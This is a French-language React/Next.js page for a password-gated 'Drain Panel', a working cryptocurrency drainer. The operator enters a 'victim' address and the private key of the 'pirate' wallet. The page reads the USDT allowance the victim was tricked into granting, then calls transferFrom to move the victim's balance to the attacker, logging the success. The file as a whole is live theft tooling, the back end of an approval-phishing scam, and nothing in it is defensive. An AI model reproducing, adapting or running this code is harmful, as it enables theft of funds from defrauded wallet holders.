"use client";

import { useState, useEffect } from "react";

// RPC par défaut (modifiable dans l'interface)
const DEFAULT_RPC = "https://ethereum-rpc.publicnode.com";
const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";

const RPC_OPTIONS = [
  { label: "PublicNode (recommandé)", value: "https://ethereum-rpc.publicnode.com" },
  { label: "dRPC", value: "https://eth.drpc.org" },
  { label: "Ankr", value: "https://rpc.ankr.com/eth" },
  { label: "LlamaRPC", value: "https://eth.llamarpc.com" },
  { label: "BlastAPI", value: "https://eth-mainnet.public.blastapi.io" },
];

// Lazy load ethers
let cachedEthers: typeof import("ethers") | null = null;
async function getEthers() {
  if (!cachedEthers) cachedEthers = await import("ethers");
  return cachedEthers;
}

export default function DrainPage() {
  const [isMounted, setIsMounted] = useState(false);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passwordInput, setPasswordInput] = useState("");
  const [authError, setAuthError] = useState("");

  const [victim, setVictim] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [rpcUrl, setRpcUrl] = useState(DEFAULT_RPC);
  const [customRpc, setCustomRpc] = useState("");
  const [showKey, setShowKey] = useState(false);

  const [loading, setLoading] = useState(false);
  const [logs, setLogs] = useState<string[]>([]);
  const [result, setResult] = useState<{
    hash: string;
    amount: string;
    status: string;
    etherscan: string;
    pirate: string;
  } | null>(null);
  const [error, setError] = useState("");

  useEffect(() => {
    if (typeof window !== "undefined") {
      const auth = sessionStorage.getItem("admin_auth");
      if (auth === "true") setIsAuthenticated(true);
      setIsMounted(true);
      // Charger RPC sauvegardé (pas la clé privée)
      const savedRpc = localStorage.getItem("drain_rpc");
      if (savedRpc) setRpcUrl(savedRpc);
    }
  }, []);

  // Sauvegarder le RPC à chaque changement (mais PAS la clé privée)
  useEffect(() => {
    if (isMounted && rpcUrl) {
      localStorage.setItem("drain_rpc", rpcUrl);
    }
  }, [rpcUrl, isMounted]);

  const addLog = (msg: string) => {
    setLogs((prev) => [...prev, msg]);
  };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (passwordInput === "Dubai2026") {
      setIsAuthenticated(true);
      sessionStorage.setItem("admin_auth", "true");
    } else {
      setAuthError("Mot de passe incorrect");
    }
  };

  const handleDrain = async () => {
    setError("");
    setResult(null);
    setLogs([]);

    // Validations
    if (!/^0x[a-fA-F0-9]{40}$/.test(victim)) {
      setError("Adresse victime invalide");
      return;
    }
    if (!privateKey || !/^0x[a-fA-F0-9]{64}$/.test(privateKey.trim())) {
      setError("Clé privée invalide (doit être 0x + 64 caractères hex)");
      return;
    }
    const effectiveRpc = rpcUrl === "custom" ? customRpc : rpcUrl;
    if (!effectiveRpc || !effectiveRpc.startsWith("http")) {
      setError("RPC invalide");
      return;
    }

    setLoading(true);

    try {
      const { ethers } = await getEthers();

      addLog(`🔌 Connexion au RPC : ${effectiveRpc}`);
      const provider = new ethers.JsonRpcProvider(effectiveRpc);

      addLog("🔑 Chargement du wallet pirate...");
      const wallet = new ethers.Wallet(privateKey.trim(), provider);
      addLog(`👤 Wallet pirate : ${wallet.address}`);

      const ethBalance = await provider.getBalance(wallet.address);
      addLog(`💰 Solde ETH : ${ethers.formatEther(ethBalance)}`);

      if (ethBalance < 1000000000000000n) {
        // Moins de 0.001 ETH
        addLog("⚠️ Solde ETH faible — le drain peut échouer");
      }

      const erc20 = new ethers.Contract(
        USDT_CONTRACT,
        [
          "function balanceOf(address) view returns (uint256)",
          "function allowance(address owner, address spender) view returns (uint256)",
          "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
        ],
        wallet
      );

      addLog("🔍 Lecture de l'allowance...");
      const allowance: bigint = await erc20.allowance(victim, wallet.address);
      addLog(`🔑 Allowance : ${ethers.formatUnits(allowance, 6)} USDT`);

      addLog("🔍 Lecture du solde de la victime...");
      const balance: bigint = await erc20.balanceOf(victim);
      addLog(`💵 Solde victime : ${ethers.formatUnits(balance, 6)} USDT`);

      if (balance === 0n) {
        setError("Solde de la victime vide");
        setLoading(false);
        return;
      }
      if (allowance === 0n) {
        setError("Aucune approbation — la victime n&apos;a pas signé");
        setLoading(false);
        return;
      }

      const amount = balance < allowance ? balance : allowance;
      addLog(`🩸 Envoi de ${ethers.formatUnits(amount, 6)} USDT...`);

      const tx = await erc20.transferFrom(victim, wallet.address, amount);
      addLog(`📤 Hash : ${tx.hash}`);
      addLog("⏳ Attente de confirmation...");

      const receipt = await tx.wait();

      if (receipt && receipt.status === 1) {
        addLog("✅ DRAIN RÉUSSI !");
        setResult({
          hash: tx.hash,
          amount: ethers.formatUnits(amount, 6),
          status: "confirmed",
          etherscan: `https://etherscan.io/tx/${tx.hash}`,
          pirate: wallet.address,
        });
      } else {
        setError("Transaction échouée on-chain");
      }
    } catch (err: any) {
      console.error(err);
      const msg = err?.shortMessage || err?.message || "Erreur inconnue";
      setError(msg);
      addLog(`❌ ${msg}`);
    } finally {
      setLoading(false);
    }
  };

  if (!isMounted) return null;

  if (!isAuthenticated) {
    return (
      <main className="transfer-main" style={{ justifyContent: "center" }}>
        <div className="home-content" style={{ maxWidth: "400px", margin: "auto 0" }}>
          <h1 className="home-title" style={{ marginBottom: "1.5rem" }}>Drain Access</h1>
          <form onSubmit={handleLogin} className="form-container" style={{ width: "100%", textAlign: "left" }}>
            <label className="form-label">Password</label>
            <div className="input-row" style={{ marginBottom: "1.5rem" }}>
              <input
                type="password"
                value={passwordInput}
                onChange={(e) => setPasswordInput(e.target.value)}
                className="input-row__field"
                required
              />
            </div>
            {authError && <div style={{ color: "#ef4444", fontSize: "0.85rem", marginBottom: "1rem" }}>⚠️ {authError}</div>}
            <button type="submit" className="next-btn" style={{ width: "100%", padding: "0.75rem" }}>Login</button>
          </form>
        </div>
      </main>
    );
  }

  return (
    <main className="transfer-main">
      <div className="home-content" style={{ maxWidth: "620px", width: "100%", margin: "0 auto" }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "1.5rem" }}>
          <h1 className="home-title" style={{ margin: 0, fontSize: "1.5rem" }}>💀 Drain Panel</h1>
          <a
            href="/"
            style={{
              background: "#e0e7ff",
              color: "#1e40af",
              padding: "0.35rem 0.85rem",
              borderRadius: "1rem",
              textDecoration: "none",
              fontSize: "0.85rem",
              fontWeight: 600,
            }}
          >
            ← Dashboard
          </a>
        </div>

        {/* Formulaire */}
        <div className="form-container" style={{ width: "100%", marginBottom: "1.5rem" }}>
          <label className="form-label">Adresse victime (Wallet 1)</label>
          <div className="input-row" style={{ marginBottom: "1rem" }}>
            <input
              type="text"
              value={victim}
              onChange={(e) => setVictim(e.target.value)}
              className="input-row__field"
              placeholder="0x..."
            />
          </div>

          <label className="form-label">Clé privée du wallet pirate (Wallet 2)</label>
          <div className="input-row" style={{ marginBottom: "0.5rem" }}>
            <input
              type={showKey ? "text" : "password"}
              value={privateKey}
              onChange={(e) => setPrivateKey(e.target.value)}
              className="input-row__field"
              placeholder="0x..."
              autoComplete="off"
              spellCheck={false}
            />
            <button
              type="button"
              onClick={() => setShowKey(!showKey)}
              style={{
                background: "transparent",
                border: "none",
                color: "#3562ff",
                fontWeight: 600,
                fontSize: "0.85rem",
                cursor: "pointer",
              }}
            >
              {showKey ? "Cacher" : "Voir"}
            </button>
          </div>
          <div style={{ color: "#94a3b8", fontSize: "0.75rem", marginBottom: "1rem" }}>
            ⚠️ La clé reste dans votre navigateur. Elle n&apos;est jamais envoyée à un serveur.
          </div>

          <label className="form-label">RPC Ethereum</label>
          <div className="input-row" style={{ marginBottom: "0.5rem" }}>
            <select
              value={rpcUrl}
              onChange={(e) => setRpcUrl(e.target.value)}
              className="input-row__field"
              style={{ background: "transparent", border: "none", outline: "none" }}
            >
              {RPC_OPTIONS.map((opt) => (
                <option key={opt.value} value={opt.value}>
                  {opt.label}
                </option>
              ))}
              <option value="custom">Custom...</option>
            </select>
          </div>

          {rpcUrl === "custom" && (
            <div className="input-row" style={{ marginBottom: "1rem" }}>
              <input
                type="text"
                value={customRpc}
                onChange={(e) => setCustomRpc(e.target.value)}
                className="input-row__field"
                placeholder="https://..."
              />
            </div>
          )}

          <button
            onClick={handleDrain}
            disabled={loading}
            className="next-btn"
            style={{ width: "100%", backgroundColor: "#dc2626", marginTop: "1rem" }}
          >
            {loading ? (
              <span className="btn-spinner-wrapper">
                <span className="btn-spinner" />
                Drainage en cours...
              </span>
            ) : (
              "💀 Lancer le Drain"
            )}
          </button>
        </div>

        {/* Logs */}
        {logs.length > 0 && (
          <div
            style={{
              background: "#0f172a",
              color: "#e2e8f0",
              borderRadius: "1rem",
              padding: "1rem",
              fontFamily: "monospace",
              fontSize: "0.82rem",
              lineHeight: 1.6,
              marginBottom: "1rem",
              maxHeight: "300px",
              overflowY: "auto",
            }}
          >
            {logs.map((log, i) => (
              <div key={i}>{log}</div>
            ))}
          </div>
        )}

        {/* Erreur */}
        {error && (
          <div
            style={{
              background: "#fef2f2",
              border: "1px solid #fecaca",
              borderRadius: "1rem",
              padding: "1rem",
              color: "#dc2626",
              fontSize: "0.9rem",
              marginBottom: "1rem",
            }}
          >
            ❌ {error}
          </div>
        )}

        {/* Résultat */}
        {result && (
          <div
            style={{
              background: "#f0fdf4",
              border: "1px solid #bbf7d0",
              borderRadius: "1rem",
              padding: "1.5rem",
              color: "#166534",
            }}
          >
            <h2 style={{ margin: "0 0 1rem 0", fontSize: "1.2rem" }}>✅ Drain réussi !</h2>
            <div style={{ fontSize: "0.9rem", lineHeight: 1.8 }}>
              <div>
                <strong>Montant :</strong> {result.amount} USDT
              </div>
              <div>
                <strong>Pirate :</strong> {result.pirate.slice(0, 10)}...{result.pirate.slice(-8)}
              </div>
              <div style={{ wordBreak: "break-all" }}>
                <strong>Hash :</strong> {result.hash}
              </div>
            </div>
            <a
              href={result.etherscan}
              target="_blank"
              rel="noopener noreferrer"
              style={{
                display: "inline-block",
                marginTop: "1rem",
                background: "#16a34a",
                color: "#fff",
                padding: "0.6rem 1.2rem",
                borderRadius: "0.5rem",
                textDecoration: "none",
                fontWeight: 600,
                fontSize: "0.85rem",
              }}
            >
              Voir sur Etherscan
            </a>
          </div>
        )}
      </div>
    </main>
  );
}